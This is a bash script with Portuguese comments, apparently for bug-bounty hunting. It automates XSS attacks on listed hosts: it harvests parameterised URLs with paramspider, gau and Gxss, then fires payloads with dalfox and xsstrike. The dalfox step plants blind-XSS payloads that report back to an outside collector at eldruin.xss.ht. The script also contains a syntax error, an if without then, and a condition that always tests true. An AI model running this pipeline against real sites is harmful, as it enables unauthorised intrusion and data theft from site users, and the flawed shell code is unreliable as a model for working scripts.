#!/bin/bash

#Este script recebe um arquivo com os hosts a serem varridos e testados
#Exemplo
#       echo bugcrowd.com >> targets.txt
#       echo hackerone.com >> targets.txt
#       fasthunt.sh targets.txt

rnd=$(date "+%T")
target=$1
agente=$2

if [[ agente="" ]]
	agente="X-BugHunter: Eldruin"
fi

echo "---> $target"
echo "------> Scraping"
#gospider -s $target -c 5 -d 5 -H $agente --blacklist ".(jpg|jpeg|js|eot|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e code-200 | awk '{print $5}' | grep = >> temp-$rnd.txt
paramspider -d $target -e jpg,jpeg,js,eot,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep = | uro >> temp-$rnd.txt
gau $target --subs --blacklist jpg,jpeg,js,eot,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep = | uro >> temp-$rnd.txt
cat temp-$rnd.txt | uro | Gxss -p eldruin >> dalfox-$rnd.txt

echo "------> Testando"
echo "---------> Dalfox"
cat dalfox-$rnd.txt | sort --random-sort | dalfox pipe --only-poc=v -S -H $agente --blind https://eldruin.xss.ht | notify -silent

echo "---------> Xsstrike"
xargs -a dalfox-$rnd.txt -I@ sh -c 'xsstrike -u @ --headers $agente'

rm temp-*.txt
rm dalfox-*.txt